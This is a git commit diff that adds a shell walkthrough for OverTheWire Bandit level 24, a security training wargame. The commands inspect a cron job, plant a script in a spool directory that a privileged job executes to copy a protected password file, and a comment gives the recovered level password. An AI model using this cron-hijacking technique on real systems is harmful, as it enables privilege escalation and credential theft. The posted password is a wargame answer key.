83d22ca5fac8eb8d83328cd403f66ed868e44162
Mohammed Ismayil <mohammedismayil10@gmail.com>
2023-09-29 19:44:58 +0530

    # Please include a useful commit message!

--- OverthewireWargame/Bandit/level_24.sh
+++ OverthewireWargame/Bandit/level_24.sh
@@ -4,3 +4,21 @@
 
 # NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
 
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+#got path from the file -> '/var/spool/$myname/foo'
+mkdir /tmp/rand
+cd /tmp/rand
+touch password
+chmod +rwx password 
+nano script.sh
+#add this script into the file
+# #!/bin/bash
+# cat /etc/bandit_pass/bandit24 > /tmp/rand/password
+chmod +rx script.sh 
+chmod 777 /tmp/rand
+cp /tmp/rand/script.sh /var/spool/bandit24/foo
+#after 1 minute
+cat password 
+#VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
